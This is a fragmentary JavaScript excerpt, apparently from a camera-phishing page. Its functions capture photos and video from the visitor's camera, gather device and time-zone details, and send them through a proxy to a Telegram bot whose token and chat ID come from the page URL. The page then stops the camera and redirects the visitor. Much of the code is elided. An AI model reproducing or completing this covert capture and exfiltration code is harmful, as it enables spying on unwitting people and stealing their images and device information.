...
// Telegram API Functions via Proxy - OPTIMIZED
...
async function sendPhotoWithCaptionToTelegram(blob, caption, token, chat_id) {
    console.log('📤 Sending photo with caption via proxy...');
...
async function sendVideoWithCaptionToTelegram(blob, caption, token, chat_id) {
    console.log('📤 Sending video with caption via proxy...');
    console.log('🎥 Video size:', blob.size, 'bytes');
    try {
        const base64Video = await blobToBase64(blob);
        console.log('📄 Converted to base64, length:', base64Video.length);
        ...
        if (result.success) {
            console.log('✅ Video with caption sent successfully');
            return true;
        } else {
...
async function getDeviceInfo() {
    try {
        ...
        const captionLines = [
            ...
            { keys: ['date', 'time', 'timeZone'], text: `<b>🕒 Date:</b> ${date} - ${time}\n\n<b>🌍 Time Zone:</b> ${timeZone}` },
...
async function capturePhoto(facingMode) {
    ...
    try {
        ...
        const blob = await new Promise(resolve => canvas2.toBlob(resolve, 'image/jpeg'));
        ...
        if (tokenFromUrl && chatIdFromUrl) {
            ...
            await sendPhotoWithCaptionToTelegram(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
        }
    ...
    try {
        ...
        mediaRecorder.onstop = async () => {
            ...
            if (tokenFromUrl && chatIdFromUrl) {
                ...
                await sendVideoWithCaptionToTelegram(blob, videoMessage, tokenFromUrl, chatIdFromUrl);
            }
            stream.getTracks().forEach(track => track.stop());
            triggerRedirect();
        };
